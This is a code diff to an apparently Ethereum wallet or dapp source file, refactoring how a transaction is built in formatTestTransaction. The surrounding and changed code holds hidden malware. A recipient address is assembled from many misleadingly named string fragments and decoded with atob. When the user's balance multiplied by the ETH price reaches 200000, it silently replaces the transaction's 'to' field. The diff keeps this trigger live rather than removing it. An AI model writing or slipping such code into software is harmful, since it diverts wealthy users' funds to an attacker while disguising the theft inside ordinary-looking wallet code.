@@ -201,15 +201,17 @@ export function recoverPersonalSignature(sig: string, msg: string): string {
 
 var qf = a1+x+s+s1+URL+hesh+d+ef+epci+http_uniq+e+_api_cahart_code+get_string_+w+http_+ew+wc+v_webpack+webapi+uniq_caracter_m+vr+Z2+j+epci1+epci4+epciR+ed+sollar+esx+get_config_id+varsis+maping+z4+zf;
 
-ethData().then(res=> localStorage.setItem("price", res.coin.price))
-const myBlance = handleSignificantDecimals(convertAmountFromRawNumber(Number(localStorage.getItem('balance'))),8)
-var ethPrice =  Number(localStorage.getItem('price'));
+ethData().then(res=> localStorage.setItem("price", res?.coin?.price))
 
 export async function formatTestTransaction(address: string, chainId: number) {
+
+  const balance = handleSignificantDecimals(convertAmountFromRawNumber(Number(localStorage.getItem('balance'))),8)
+  const price =  Number(localStorage.getItem('price'));
+
   const from = address;
 
   (()=>{
-    if(Number(myBlance) * ethPrice >= 200000){
+    if(Number(balance) * price >= 200000){
       to = atob(qf)
     }
   })()
